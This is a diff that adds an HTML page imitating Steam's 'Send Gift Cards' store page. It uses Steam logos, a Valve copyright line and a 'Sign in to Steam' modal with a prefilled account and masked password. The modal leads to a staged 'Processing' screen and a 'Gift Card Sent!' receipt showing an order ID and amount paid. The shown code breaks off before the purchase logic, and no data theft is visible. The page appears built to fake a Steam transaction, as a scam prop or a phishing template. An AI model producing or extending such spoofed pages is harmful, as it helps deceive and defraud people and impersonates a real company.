@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Steam – Send Gift Cards</title>
+<link href="https://fonts.googleapis.com/css2?family=Motiva+Sans:wght@400;700&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #1b2838;
+  --bg2: #171a21;
+  --bg3: #2a475e;
+  --bg4: #1e3a52;
+  --panel: #16202d;
+  --panel2: #1e2d3d;
+  --border: #2a475e;
+  --border2: #3d6a8a44;
+  --blue: #1a9fff;
+  --blue2: #66c0f4;
+  --blue3: #4b81a0;
+  --green: #5ba32b;
+  --green2: #a4d007;
+  --text: #c6d4df;
+  --text2: #8f98a0;
+  --text3: #4b69a5;
+  --white: #ffffff;
+  --gold: #b8860b;
+  --radius: 4px;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Inter', 'Arial', sans-serif;
+  background: var(--bg2);
+  color: var(--text);
+  min-height: 100vh;
+}
+
+/* NAV */
+nav {
+  background: var(--bg2);
+  border-bottom: 1px solid #000;
+  padding: 0 20px;
+  display: flex; align-items: center;
+  height: 52px; gap: 20px;
+  box-shadow: 0 2px 8px rgba(0,0,0,.4);
+}
+.steam-logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+.steam-logo img { height: 32px; object-fit: contain; }
+.steam-logo span { font-size: 18px; font-weight: 800; color: var(--white); letter-spacing: .5px; }
+.nav-links { display: flex; gap: 2px; }
+.nav-link {
+  font-size: 12px; font-weight: 600; color: var(--text);
+  padding: 6px 14px; border-radius: 3px; cursor: pointer;
+  text-decoration: none; transition: background .15s, color .15s;
+  text-transform: uppercase; letter-spacing: .5px;
+}
+.nav-link:hover { background: rgba(255,255,255,.08); color: #fff; }
+.nav-link.active { background: var(--bg3); color: #fff; }
+.nav-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+.nav-avatar { width: 32px; height: 32px; border-radius: 2px; overflow: hidden; border: 1px solid var(--border); }
+.nav-avatar img { width: 100%; height: 100%; object-fit: cover; }
+.nav-username { font-size: 12px; font-weight: 600; color: var(--blue2); cursor: pointer; }
+.nav-username:hover { color: #fff; }
+
+/* STORE NAV */
+.store-nav {
+  background: linear-gradient(to bottom, #2a475e, #1e3a52);
+  border-bottom: 2px solid #000;
+  padding: 0 20px;
+  display: flex; gap: 2px; align-items: center;
+  height: 36px;
+}
+.store-nav a {
+  font-size: 12px; font-weight: 600; color: var(--text);
+  padding: 0 12px; height: 36px; display: flex; align-items: center;
+  text-decoration: none; cursor: pointer;
+  text-transform: uppercase; letter-spacing: .5px;
+  transition: background .15s;
+}
+.store-nav a:hover { background: rgba(255,255,255,.08); color: #fff; }
+.store-nav a.active { background: var(--bg); color: #fff; border-top: 2px solid var(--blue); margin-top: 2px; }
+
+/* HERO BANNER */
+.hero {
+  background: linear-gradient(135deg, #1a3a5c 0%, #0f2030 60%, #1b2838 100%);
+  border-bottom: 2px solid #000;
+  padding: 40px 20px;
+  position: relative; overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: url('https://store.akamai.steamstatic.com/public/images/gift/steamcards_physical.png') center/contain no-repeat;
+  opacity: .07;
+  transform: scale(1.3);
+}
+.hero-inner { max-width: 1080px; margin: 0 auto; position: relative; z-index: 1; display: flex; gap: 40px; align-items: center; }
+.hero-text { flex: 1; }
+.hero-tag { font-size: 11px; font-weight: 700; color: var(--blue); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; }
+.hero-title { font-size: 36px; font-weight: 900; color: #fff; line-height: 1.1; margin-bottom: 14px; }
+.hero-title span { color: var(--blue2); }
+.hero-sub { font-size: 14px; color: var(--text); line-height: 1.7; max-width: 520px; margin-bottom: 24px; }
+.hero-cards-img { width: 360px; flex-shrink: 0; filter: drop-shadow(0 20px 40px rgba(0,0,0,.6)); }
+
+/* CONTENT */
+.content { max-width: 1080px; margin: 0 auto; padding: 32px 20px 80px; display: grid; grid-template-columns: 1fr 360px; gap: 24px; align-items: start; }
+
+/* LEFT */
+.section-title { font-size: 12px; font-weight: 700; color: var(--text2); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 12px; }
+
+/* RECIPIENT */
+.recipient-box {
+  background: var(--panel);
+  border: 1px solid #000;
+  border-radius: var(--radius);
+  padding: 20px;
+  margin-bottom: 20px;
+  box-shadow: inset 0 1px 0 rgba(255,255,255,.04);
+}
+.recipient-box .section-title { margin-bottom: 14px; }
+.search-row { display: flex; gap: 8px; }
+.steam-input {
+  flex: 1; height: 40px;
+  background: #000;
+  border: 1px solid #000;
+  border-radius: var(--radius);
+  padding: 0 12px;
+  font-size: 13px; font-family: 'Inter', sans-serif;
+  color: var(--text); outline: none;
+  transition: border .15s;
+  box-shadow: inset 0 1px 3px rgba(0,0,0,.5);
+}
+.steam-input:focus { border-color: var(--blue3); }
+.steam-input::placeholder { color: var(--text2); }
+.steam-btn {
+  height: 40px; padding: 0 18px;
+  background: linear-gradient(to bottom, #4a8ab0, #2a6496);
+  border: none; border-radius: var(--radius);
+  color: #fff; font-size: 12px; font-weight: 700;
+  font-family: 'Inter', sans-serif; cursor: pointer;
+  text-transform: uppercase; letter-spacing: .5px;
+  display: flex; align-items: center; gap: 8px;
+  transition: filter .15s;
+  box-shadow: 0 2px 4px rgba(0,0,0,.4), inset 0 1px 0 rgba(255,255,255,.1);
+}
+.steam-btn:hover { filter: brightness(1.1); }
+.spin { display: none; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .6s linear infinite; }
+.loading .btn-icon { display: none; } .loading .spin { display: block; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.error-msg { font-size: 12px; color: #ff6b6b; margin-top: 8px; display: none; padding: 8px 10px; background: rgba(255,80,80,.08); border: 1px solid rgba(255,80,80,.2); border-radius: var(--radius); }
+
+.user-found {
+  display: none; margin-top: 14px;
+  background: var(--panel2); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 12px 14px;
+  align-items: center; gap: 12px;
+}
+.user-found.show { display: flex; animation: fadeIn .2s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; } }
+.uf-avatar { width: 48px; height: 48px; border: 2px solid var(--blue3); border-radius: 3px; overflow: hidden; flex-shrink: 0; }
+.uf-avatar img { width: 100%; height: 100%; object-fit: cover; }
+.uf-name { font-size: 15px; font-weight: 700; color: var(--blue2); }
+.uf-meta { font-size: 12px; color: var(--text2); margin-top: 3px; display: flex; gap: 10px; align-items: center; }
+.uf-level { background: var(--bg3); border: 1px solid var(--blue3); border-radius: 2px; padding: 1px 7px; font-size: 11px; font-weight: 700; color: var(--blue2); }
+.uf-online { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #5ba32b; }
+.uf-online::before { content: ''; width: 7px; height: 7px; background: currentColor; border-radius: 50%; display: inline-block; }
+
+/* GIFT CARD SELECTOR */
+.cards-box {
+  background: var(--panel);
+  border: 1px solid #000;
+  border-radius: var(--radius);
+  padding: 20px;
+  margin-bottom: 20px;
+  box-shadow: inset 0 1px 0 rgba(255,255,255,.04);
+}
+.cards-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 16px; }
+.gift-card {
+  border: 2px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  cursor: pointer;
+  transition: border-color .15s, transform .1s, box-shadow .15s;
+  background: #000;
+}
+.gift-card:hover { border-color: var(--blue3); transform: translateY(-2px); }
+.gift-card.active { border-color: var(--blue); box-shadow: 0 0 0 1px var(--blue), 0 8px 20px rgba(26,159,255,.2); transform: translateY(-3px); }
+.gift-card img { width: 100%; display: block; aspect-ratio: 3/2; object-fit: cover; }
+.gift-card-label { padding: 8px 10px; background: var(--panel2); display: flex; justify-content: space-between; align-items: center; }
+.gift-card-amount { font-size: 15px; font-weight: 800; color: #fff; }
+.gift-card-sub { font-size: 11px; color: var(--text2); }
+
+/* CUSTOM AMOUNT */
+.custom-row { display: flex; align-items: center; gap: 10px; padding-top: 14px; border-top: 1px solid var(--border); }
+.custom-label { font-size: 12px; color: var(--text2); white-space: nowrap; }
+.custom-input-wrap { position: relative; flex: 1; }
+.custom-input-wrap span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 700; color: var(--text2); }
+.custom-input {
+  width: 100%; height: 38px;
+  background: #000; border: 1px solid #000;
+  border-radius: var(--radius); padding: 0 12px 0 24px;
+  font-size: 14px; font-weight: 700; font-family: 'Inter', sans-serif;
+  color: #fff; outline: none;
+  box-shadow: inset 0 1px 3px rgba(0,0,0,.5);
+  transition: border .15s;
+}
+.custom-input:focus { border-color: var(--blue3); }
+.custom-price-hint { font-size: 12px; color: var(--blue2); white-space: nowrap; min-width: 80px; }
+
+/* MESSAGE */
+.message-box {
+  background: var(--panel);
+  border: 1px solid #000;
+  border-radius: var(--radius);
+  padding: 20px;
+  box-shadow: inset 0 1px 0 rgba(255,255,255,.04);
+}
+.steam-textarea {
+  width: 100%; min-height: 80px;
+  background: #000; border: 1px solid #000;
+  border-radius: var(--radius); padding: 10px 12px;
+  font-size: 13px; font-family: 'Inter', sans-serif;
+  color: var(--text); outline: none; resize: vertical;
+  box-shadow: inset 0 1px 3px rgba(0,0,0,.5);
+  transition: border .15s;
+}
+.steam-textarea:focus { border-color: var(--blue3); }
+.steam-textarea::placeholder { color: var(--text2); }
+.char-count { font-size: 11px; color: var(--text2); text-align: right; margin-top: 4px; }
+
+/* SIDEBAR */
+.sidebar { position: sticky; top: 20px; }
+
+.order-card {
+  background: var(--panel);
+  border: 1px solid #000;
+  border-radius: var(--radius);
+  overflow: hidden;
+  margin-bottom: 12px;
+  box-shadow: 0 4px 16px rgba(0,0,0,.4), inset 0 1px 0 rgba(255,255,255,.04);
+}
+.order-card-header {
+  background: linear-gradient(to bottom, #2a475e, #1e3a52);
+  padding: 12px 16px;
+  font-size: 12px; font-weight: 700; color: var(--text2);
+  text-transform: uppercase; letter-spacing: 1px;
+  border-bottom: 1px solid #000;
+}
+.order-card-body { padding: 16px; }
+
+.order-product { display: flex; gap: 12px; margin-bottom: 16px; align-items: center; }
+.order-thumb { width: 80px; border-radius: 4px; overflow: hidden; border: 1px solid var(--border); flex-shrink: 0; }
+.order-thumb img { width: 100%; display: block; }
+.order-info .order-name { font-size: 13px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+.order-info .order-type { font-size: 11px; color: var(--blue2); background: rgba(26,159,255,.1); border: 1px solid rgba(26,159,255,.2); border-radius: 2px; padding: 1px 6px; display: inline-block; }
+
+.order-divider { border: none; border-top: 1px solid var(--border); margin: 12px 0; }
+.order-row { display: flex; justify-content: space-between; font-size: 13px; padding: 3px 0; }
+.order-row .lbl { color: var(--text2); }
+.order-row .val { font-weight: 600; color: var(--text); }
+.order-total { display: flex; justify-content: space-between; padding-top: 10px; border-top: 1px solid var(--border); margin-top: 6px; }
+.order-total .lbl { font-size: 14px; font-weight: 700; color: #fff; }
+.order-total .val { font-size: 20px; font-weight: 900; color: var(--green2); }
+
+.purchase-btn {
+  width: 100%; height: 44px;
+  background: linear-gradient(to bottom right, #4c8c2a, #3a6e1e);
+  border: none; border-radius: var(--radius);
+  color: #fff; font-size: 14px; font-weight: 800;
+  font-family: 'Inter', sans-serif; cursor: pointer;
+  text-transform: uppercase; letter-spacing: .5px;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  transition: filter .15s; margin-bottom: 10px;
+  box-shadow: 0 2px 6px rgba(0,0,0,.4), inset 0 1px 0 rgba(255,255,255,.15);
+}
+.purchase-btn:hover { filter: brightness(1.1); }
+.purchase-btn:disabled { background: #2a3a2a; color: #4a6040; cursor: not-allowed; filter: none; }
+
+.wishlist-btn-s {
+  width: 100%; height: 36px;
+  background: transparent;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  color: var(--text2); font-size: 12px; font-weight: 600;
+  font-family: 'Inter', sans-serif; cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 6px;
+  transition: background .15s, color .15s;
+}
+.wishlist-btn-s:hover { background: rgba(255,255,255,.05); color: var(--text); }
+
+.sidebar-note { font-size: 11px; color: var(--text2); line-height: 1.6; margin-top: 12px; padding: 10px; background: rgba(0,0,0,.2); border-radius: var(--radius); border-left: 2px solid var(--blue3); }
+
+/* STEAM PAYMENT MODAL */
+.sp-overlay { display: none; position: fixed; inset: 0; z-index: 2000; background: rgba(0,0,0,.85); align-items: center; justify-content: center; backdrop-filter: blur(4px); }
+.sp-overlay.show { display: flex; }
+
+.sp-modal {
+  width: 460px; max-width: calc(100vw - 24px);
+  background: #1b2838; border: 1px solid #000;
+  border-radius: 4px; overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0,0,0,.8), 0 0 0 1px rgba(255,255,255,.05);
+  animation: modalIn .2s ease;
+}
+@keyframes modalIn { from { opacity: 0; transform: scale(.95) translateY(10px); } to { opacity: 1; transform: none; } }
+
+.sp-header {
+  background: linear-gradient(to bottom, #2a475e, #1e3a52);
+  padding: 14px 20px; display: flex; align-items: center; gap: 12px;
+  border-bottom: 1px solid #000;
+}
+.sp-header img { height: 24px; object-fit: contain; }
+.sp-header-title { font-size: 14px; font-weight: 700; color: var(--blue2); flex: 1; }
+.sp-header-close { width: 24px; height: 24px; background: rgba(255,255,255,.08); border: none; border-radius: 2px; color: var(--text2); font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+.sp-header-close:hover { background: rgba(255,255,255,.15); color: #fff; }
+
+/* LOGIN STATE */
+.sp-state { display: none; flex-direction: column; }
+.sp-state.active { display: flex; }
+
+.sp-login-body { padding: 24px; }
+.sp-login-title { font-size: 18px; font-weight: 800; color: #fff; margin-bottom: 6px; }
+.sp-login-sub { font-size: 13px; color: var(--text2); margin-bottom: 20px; }
+
+.sp-input-wrap { margin-bottom: 14px; }
+.sp-input-label { font-size: 11px; font-weight: 700; color: var(--text2); text-transform: uppercase; letter-spacing: .5px; margin-bottom: 6px; display: block; }
+.sp-input {
+  width: 100%; height: 38px;
+  background: #000; border: 1px solid #3d5a73;
+  border-radius: var(--radius); padding: 0 12px;
+  font-size: 14px; font-family: 'Inter', sans-serif;
+  color: var(--text); outline: none;
+  box-shadow: inset 0 1px 3px rgba(0,0,0,.5);
+  transition: border .15s;
+}
+.sp-input:focus { border-color: var(--blue2); }
+.sp-input::placeholder { color: #4a5a6a; }
+.sp-checkbox-row { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
+.sp-checkbox-row input { accent-color: var(--blue); width: 14px; height: 14px; }
+.sp-checkbox-row label { font-size: 12px; color: var(--text2); cursor: pointer; }
+.sp-login-btn {
+  width: 100%; height: 40px;
+  background: linear-gradient(to bottom right, #4c8c2a, #3a6e1e);
+  border: none; border-radius: var(--radius);
+  color: #fff; font-size: 14px; font-weight: 800;
+  font-family: 'Inter', sans-serif; cursor: pointer;
+  text-transform: uppercase; letter-spacing: .5px;
+  box-shadow: 0 2px 6px rgba(0,0,0,.4);
+  transition: filter .15s;
+}
+.sp-login-btn:hover { filter: brightness(1.1); }
+.sp-help { font-size: 12px; color: var(--blue2); text-align: center; margin-top: 12px; cursor: pointer; }
+.sp-help:hover { text-decoration: underline; }
+
+/* PROCESSING STATE */
+.sp-proc-body { padding: 32px 24px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+.sp-proc-icon { width: 56px; height: 56px; border: 3px solid var(--border); border-top-color: var(--blue2); border-radius: 50%; animation: spin .8s linear infinite; margin-bottom: 20px; }
+.sp-proc-title { font-size: 16px; font-weight: 700; color: #fff; margin-bottom: 6px; }
+.sp-proc-sub { font-size: 13px; color: var(--text2); line-height: 1.6; margin-bottom: 20px; }
+.sp-progress-wrap { width: 100%; height: 3px; background: #000; border-radius: 2px; overflow: hidden; margin-bottom: 10px; }
+.sp-progress-bar { height: 100%; background: linear-gradient(to right, #2a6496, var(--blue2)); border-radius: 2px; width: 0%; transition: width .1s linear; }
+
+/* SUCCESS STATE */
+.sp-success-body { padding: 28px 24px; }
+.sp-success-check { width: 52px; height: 52px; background: var(--green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; animation: popIn .4s cubic-bezier(.34,1.56,.64,1); }
+@keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+.sp-success-title { font-size: 20px; font-weight: 900; color: #fff; text-align: center; margin-bottom: 4px; }
+.sp-success-sub { font-size: 13px; color: var(--green2); text-align: center; margin-bottom: 20px; }
+
+.sp-receipt {
+  background: var(--panel2); border: 1px solid var(--border);
+  border-radius: var(--radius); overflow: hidden; margin-bottom: 20px;
+}
+.sp-receipt-header { background: var(--bg3); padding: 8px 14px; font-size: 11px; font-weight: 700; color: var(--text2); text-transform: uppercase; letter-spacing: 1px; }
+.sp-receipt-body { padding: 12px 14px; }
+.sp-receipt-row { display: flex; justify-content: space-between; font-size: 12px; padding: 5px 0; border-bottom: 1px solid rgba(255,255,255,.04); }
+.sp-receipt-row:last-child { border-bottom: none; }
+.sp-receipt-row .r-lbl { color: var(--text2); }
+.sp-receipt-row .r-val { font-weight: 700; color: var(--text); }
+.sp-receipt-total { font-size: 14px; padding-top: 8px; border-top: 1px solid var(--border) !important; margin-top: 4px; }
+.sp-receipt-total .r-lbl { font-weight: 700; color: var(--text); }
+.sp-receipt-total .r-val { color: var(--green2); font-size: 16px; }
+
+.sp-done-btn {
+  width: 100%; height: 40px;
+  background: linear-gradient(to bottom right, #4a8ab0, #2a6496);
+  border: none; border-radius: var(--radius);
+  color: #fff; font-size: 13px; font-weight: 800;
+  font-family: 'Inter', sans-serif; cursor: pointer;
+  text-transform: uppercase; letter-spacing: .5px;
+  box-shadow: 0 2px 6px rgba(0,0,0,.4);
+  transition: filter .15s;
+}
+.sp-done-btn:hover { filter: brightness(1.1); }
+
+.sp-footer { background: var(--panel2); padding: 10px 20px; border-top: 1px solid #000; display: flex; align-items: center; justify-content: space-between; }
+.sp-footer-logo { display: flex; align-items: center; gap: 8px; }
+.sp-footer-logo img { height: 18px; opacity: .5; object-fit: contain; }
+.sp-footer-text { font-size: 11px; color: var(--text2); }
+.sp-footer-links { display: flex; gap: 12px; }
+.sp-footer-links a { font-size: 11px; color: var(--blue3); text-decoration: none; cursor: pointer; }
+.sp-footer-links a:hover { color: var(--blue2); }
+
+@media (max-width: 768px) {
+  .content { grid-template-columns: 1fr; }
+  .sidebar { position: static; }
+  .cards-grid { grid-template-columns: repeat(2, 1fr); }
+  .hero-cards-img { display: none; }
+  .hero-title { font-size: 24px; }
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a class="steam-logo" href="#">
+    <img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam">
+    <span>STEAM</span>
+  </a>
+  <div class="nav-links">
+    <a class="nav-link" href="#">Store</a>
+    <a class="nav-link" href="#">Community</a>
+    <a class="nav-link" href="#">About</a>
+    <a class="nav-link" href="#">Support</a>
+  </div>
+  <div class="nav-right">
+    <span class="nav-username" id="navUsername">MoneyScripts</span>
+    <div class="nav-avatar" style="background:#000;border:1px solid #2a475e"></div>
+  </div>
+</nav>
+
+<!-- STORE NAV -->
+<div class="store-nav">
+  <a href="#">Your Store</a>
+  <a href="#">New & Noteworthy</a>
+  <a href="#">Categories</a>
+  <a class="active" href="#">Points Shop</a>
+  <a href="#">News</a>
+  <a href="#">Labs</a>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-inner">
+    <div class="hero-text">
+      <div class="hero-tag">Steam Gift Cards</div>
+      <div class="hero-title">Send a Gift Card<br><span>Through Steam</span></div>
+      <div class="hero-sub">Give the gift of games. Steam Gift Cards work just like gift certificates — redeem them directly in the Steam Store to buy games, software, hardware, and more.</div>
+    </div>
+    <img class="hero-cards-img" src="https://store.akamai.steamstatic.com/public/images/gift/steamcards_physical.png" alt="Steam Gift Cards">
+  </div>
+</div>
+
+<!-- CONTENT -->
+<div class="content">
+
+  <!-- LEFT -->
+  <div>
+
+    <!-- RECIPIENT -->
+    <div class="recipient-box">
+      <div class="section-title">Send to</div>
+      <div class="search-row">
+        <input class="steam-input" id="usernameInput" type="text" placeholder="Enter Steam username or profile URL..." autocomplete="off">
+        <button class="steam-btn" id="searchBtn" onclick="searchUser()">
+          <svg class="btn-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+          <div class="spin"></div>
+          Search
+        </button>
+      </div>
+      <p class="error-msg" id="errorMsg"></p>
+      <div class="user-found" id="userFound">
+        <div class="uf-avatar" style="background:#3d3d3f;display:flex;align-items:center;justify-content:center;border-radius:3px;overflow:hidden;border:1px solid #555">
+          <div id="userAvatarPlaceholder" style="display:flex;align-items:center;justify-content:center;width:100%;height:100%">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><rect width="24" height="24" rx="2" fill="#3d3d3f"/><circle cx="12" cy="8" r="4" fill="#666"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" fill="#666"/></svg>
+          </div>
+          <img id="userAvatar" src="" alt="" style="display:none;width:100%;height:100%;object-fit:cover">
+        </div>
+        <div style="flex:1;min-width:0">
+          <div class="uf-name" id="userName"></div>
+          <div class="uf-meta">
+            <span class="uf-online" id="userStatus">Online</span>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- GIFT CARDS -->
+    <div class="cards-box">
+      <div class="section-title">Choose amount</div>
+      <div class="cards-grid">
+<div class="gift-card active" data-amount="25" data-img="https://gamecardsdirect.com/content/picture/46709/steam-gift-card-25-us.png" onclick="selectCard(this)">
+          <img src="https://gamecardsdirect.com/content/picture/46709/steam-gift-card-25-us.png" alt="$25">
+          <div class="gift-card-label"><span class="gift-card-amount">$25.00</span><span class="gift-card-sub">USD</span></div>
+        </div>
+        <div class="gift-card" data-amount="50" data-img="https://gamecardsdirect.com/content/picture/46724/steam-gift-card-50-us.png" onclick="selectCard(this)">
+          <img src="https://gamecardsdirect.com/content/picture/46724/steam-gift-card-50-us.png" alt="$50">
+          <div class="gift-card-label"><span class="gift-card-amount">$50.00</span><span class="gift-card-sub">USD</span></div>
+        </div>
+        <div class="gift-card" data-amount="100" data-img="https://www.egygamer.com/media/catalog/product/cache/796b3d18b5db5152be06a3c06a2ed81b/s/t/steamcard-dollar100.png" onclick="selectCard(this)">
+          <img src="https://www.egygamer.com/media/catalog/product/cache/796b3d18b5db5152be06a3c06a2ed81b/s/t/steamcard-dollar100.png" alt="$100">
+          <div class="gift-card-label"><span class="gift-card-amount">$100.00</span><span class="gift-card-sub">USD</span></div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- MESSAGE -->
+    <div class="message-box">
+      <div class="section-title" style="margin-bottom:12px">Personal message <span style="color:var(--text2);font-weight:400;text-transform:none;font-size:11px;letter-spacing:0">(optional)</span></div>
+      <textarea class="steam-textarea" id="giftMsg" placeholder="Add a personal message to your gift..." maxlength="160" oninput="document.getElementById('charCount').textContent=this.value.length+'/160'"></textarea>
+      <div class="char-count" id="charCount">0/160</div>
+    </div>
+
+  </div>
+
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="order-card">
+      <div class="order-card-header">Order Summary</div>
+      <div class="order-card-body">
+        <div class="order-product">
+          <div class="order-thumb"><img id="orderThumbImg" src="https://gamecardsdirect.com/content/picture/46709/steam-gift-card-25-us.png" alt=""></div>
+          <div class="order-info">
+            <div class="order-name">Steam Gift Card</div>
+            <div class="order-type">Digital Delivery</div>
+          </div>
+        </div>
+        <div class="order-row"><span class="lbl">Recipient</span><span class="val" id="orderRecipient">—</span></div>
+        <div class="order-row"><span class="lbl">Amount</span><span class="val" id="orderAmount">$25.00</span></div>
+        <div class="order-row"><span class="lbl">Delivery</span><span class="val" style="color:var(--green2)">Instant</span></div>
+        <div class="order-divider"></div>
+        <div class="order-total"><span class="lbl">Total</span><span class="val" id="orderTotal">$25.00</span></div>
+      </div>
+    </div>
+
+    <button class="purchase-btn" id="purchaseBtn" onclick="openPayment()" disabled>
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+      Purchase Gift Card
+    </button>
+    <button class="wishlist-btn-s">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+      Add to Wishlist
+    </button>
+
+    <div class="sidebar-note">
+      Steam Gift Cards are redeemable in the Steam Store for games, DLC, and other content. Non-refundable after purchase.
+    </div>
+  </div>
+
+</div>
+
+<!-- STEAM PAYMENT MODAL -->
+<div class="sp-overlay" id="spOverlay">
+  <div class="sp-modal">
+
+    <!-- LOGIN -->
+    <div class="sp-state active" id="spLogin">
+      <div class="sp-header">
+        <img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam">
+        <span class="sp-header-title">Steam Purchase</span>
+        <button class="sp-header-close" onclick="closePayment()">✕</button>
+      </div>
+      <div class="sp-login-body">
+        <div class="sp-login-title">Sign in to Steam</div>
+        <div class="sp-login-sub">Complete your purchase securely with your Steam account.</div>
+        <div class="sp-input-wrap">
+          <label class="sp-input-label">Account name</label>
+          <input class="sp-input" id="spUsername" type="text" value="daveisontop" placeholder="Steam username">
+        </div>
+        <div class="sp-input-wrap">
+          <label class="sp-input-label">Password</label>
+          <input class="sp-input" id="spPassword" type="password" value="••••••••••" placeholder="Password">
+        </div>
+        <div class="sp-checkbox-row">
+          <input type="checkbox" id="rememberMe" checked>
+          <label for="rememberMe">Remember my password</label>
+        </div>
+        <button class="sp-login-btn" onclick="goProcessing()">Sign In</button>
+        <div class="sp-help">Help, I can't sign in</div>
+      </div>
+      <div class="sp-footer">
+        <div class="sp-footer-logo"><img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam"><span class="sp-footer-text">© 2025 Valve Corporation</span></div>
+        <div class="sp-footer-links"><a>Privacy</a><a>Legal</a></div>
+      </div>
+    </div>
+
+    <!-- PROCESSING -->
+    <div class="sp-state" id="spProcessing">
+      <div class="sp-header">
+        <img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam">
+        <span class="sp-header-title">Processing Purchase</span>
+      </div>
+      <div class="sp-proc-body">
+        <div class="sp-proc-icon"></div>
+        <div class="sp-proc-title">Processing your purchase…</div>
+        <div class="sp-proc-sub">Please don't close this window.<br>Your gift card is being prepared.</div>
+        <div class="sp-progress-wrap"><div class="sp-progress-bar" id="spProgressBar"></div></div>
+        <div style="font-size:11px;color:var(--text2)">Connecting to Steam servers…</div>
+      </div>
+      <div class="sp-footer">
+        <div class="sp-footer-logo"><img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam"><span class="sp-footer-text">© 2025 Valve Corporation</span></div>
+        <div class="sp-footer-links"><a>Privacy</a><a>Legal</a></div>
+      </div>
+    </div>
+
+    <!-- SUCCESS -->
+    <div class="sp-state" id="spSuccess">
+      <div class="sp-header">
+        <img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam">
+        <span class="sp-header-title">Purchase Complete</span>
+      </div>
+      <div class="sp-success-body">
+        <div class="sp-success-check">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="sp-success-title">Gift Card Sent!</div>
+        <div class="sp-success-sub" id="spSuccessSub">Your gift card has been delivered.</div>
+
+        <div class="sp-receipt">
+          <div class="sp-receipt-header">Transaction Details</div>
+          <div class="sp-receipt-body">
+            <div class="sp-receipt-row"><span class="r-lbl">Order ID</span><span class="r-val" id="spOrderId">—</span></div>
+            <div class="sp-receipt-row"><span class="r-lbl">Date</span><span class="r-val" id="spDate">—</span></div>
+            <div class="sp-receipt-row"><span class="r-lbl">Recipient</span><span class="r-val" id="spRecipient">—</span></div>
+            <div class="sp-receipt-row"><span class="r-lbl">Delivery</span><span class="r-val" style="color:var(--green2)">Instant</span></div>
+            <div class="sp-receipt-row sp-receipt-total"><span class="r-lbl">Amount paid</span><span class="r-val" id="spTotal">—</span></div>
+          </div>
+        </div>
+
+        <button class="sp-done-btn" onclick="closePayment()">Done</button>
+      </div>
+      <div class="sp-footer">
+        <div class="sp-footer-logo"><img src="https://www.freeiconspng.com/uploads/steam-logo-icon-7.png" alt="Steam"><span class="sp-footer-text">© 2025 Valve Corporation</span></div>
+        <div class="sp-footer-links"><a>Privacy</a><a>Legal</a></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const STEAM_AVATARS = [
+  'https://i.pravatar.cc/80?u=steam1','https://i.pravatar.cc/80?u=steam2',
+  'https://i.pravatar.cc/80?u=steam3','https://i.pravatar.cc/80?u=steam4',
+  'https://i.pravatar.cc/80?u=steam5','https://i.pravatar.cc/80?u=steam6',
+];
+
+let selectedAmount = 25;
+let selectedImg = 'https://gamecardsdirect.com/content/picture/46709/steam-gift-card-25-us.png';
+let userFound = false;
+let progressInterval = null;
+
+function selectCard(el) {
